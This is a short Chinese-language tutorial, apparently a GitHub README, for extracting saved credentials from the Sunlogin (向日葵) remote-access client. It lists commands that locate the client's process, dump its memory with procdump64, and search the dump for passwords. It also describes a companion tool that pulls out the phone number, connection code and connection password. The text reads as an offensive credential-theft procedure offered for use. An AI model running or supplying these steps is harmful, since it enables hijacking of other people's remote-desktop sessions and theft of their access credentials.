
### 0x01 🌟 前言
#### 向日葵 密码读取教程+工具

----------
### 0x02 🔍 读取PID
```bash
tasklist | find /I "SunloginClient.exe"
```
#### 此时会出现两个程序，请找到非 Services 的 PID。
![30265e192266c5b91603fb27d74cd103](https://github.com/user-attachments/assets/dead6f51-a780-4bab-9a34-9d447b947af4)

#### 使用 procdump64.exe，通过 cmd 输入以下命令：
```bash
procdump64.exe -accepteula -ma 你的PID
```
#### 你将得到一个类似 `SunloginClient.exe_240909_163416.dmp` 的文件。
![d0b045d53b127b91adc3536b2369654a](https://github.com/user-attachments/assets/791090e3-d92f-4433-9dd4-1210f5020f1e)

-----------
### 0x03 🛠 手动提取
#### 使用 010Editor 打开 dmp 文件并手动查找：
```bash
搜索password即可
```
![7dab023ad9d97d41b998d0b80bde786d](https://github.com/user-attachments/assets/d420b6ec-2733-4a7a-8a8c-75a6b298abe5)

-----------
### 0x04 💻 软件提取
#### 为了方便，我编写了一个工具，输入日期并选择文件即可自动提取。
#### 提取内容包括：手机号、连接码、连接密码。
```bash
通过工具选择dmp文件后，即可输出所需信息
```
![0c096b3763a55206645abd81964c45fe](https://github.com/user-attachments/assets/e9437c59-e095-45b9-9b16-0afa8c63b75a)
